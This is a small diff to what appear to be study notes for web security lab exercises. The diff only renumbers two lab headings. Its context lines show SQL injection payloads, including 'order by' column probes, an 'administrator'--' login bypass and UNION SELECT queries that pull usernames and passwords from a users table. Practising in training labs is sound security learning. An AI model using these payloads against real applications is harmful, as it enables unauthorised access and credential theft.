@@ -54,7 +54,7 @@ administrator'--
   ```sh
 '+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
   ```
-### Lab: SQL injection attack, listing the database contents on Oracle
+### Lab6: SQL injection attack, listing the database contents on Oracle
 ```sh
 order by 2--
 ```
@@ -70,7 +70,7 @@ order by 2--
 ```sh
 '+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
 ```
-### Lab: SQL injection UNION attack, determining the number of columns returned by the query
+### Lab7: SQL injection UNION attack, determining the number of columns returned by the query
 ```sh
 order by 3--
 ```
